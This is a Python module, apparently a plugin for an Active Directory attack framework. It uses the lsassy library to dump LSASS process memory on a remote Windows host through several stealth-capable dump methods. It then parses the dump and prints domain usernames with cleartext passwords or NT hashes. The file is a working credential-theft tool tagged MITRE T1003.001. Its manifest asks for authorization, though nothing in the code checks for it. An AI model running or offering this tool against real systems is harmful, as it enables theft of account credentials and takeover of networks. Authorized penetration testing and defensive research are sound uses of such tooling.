"""Remote LSASS dump parsing via lsassy.

Extracts credentials from LSASS memory remotely using multiple
dump methods (comsvcs, procdump, nanodump, PPLdump).
"""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.credential.lsassy.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["lsass_memory_read", "smb_connection"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.001"],
}

DUMP_METHODS = [
    "comsvcs", "comsvcs_stealth", "procdump", "procdump_embedded",
    "nanodump", "ppldump", "pplfault", "mirrordump", "wer",
]


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    method = getattr(args, "method", "comsvcs")
    output_dir = getattr(args, "output", ".")

    print(f"[*] lsassy → {target} (method: {method})")

    try:
        from lsassy import Dumper, Parser, Logger
    except ImportError:
        print("[!] lsassy not installed: pip install lsassy", file=sys.stderr)
        return 1

    try:
        dumper = Dumper(
            target, cred.username, cred.password or "",
            cred.domain, cred.lm_hash, cred.nt_hash,
            method=method,
        )
        dump_ok = dumper.dump()
        if not dump_ok:
            print("[-] LSASS dump failed")
            return 1

        parser = Parser(dumper.get_file())
        credentials = parser.parse()

        print(f"[+] Extracted {len(credentials)} credentials:")
        for c in credentials:
            print("  {}\\{} : {} (type: {})".format(
                c.get("domain", ""), c.get("username", ""),
                c.get("password") or c.get("nthash", ""), c.get("credtype", "")))
        return 0

    except Exception as exc:
        print(f"[-] lsassy error: {exc}", file=sys.stderr)
        return 1
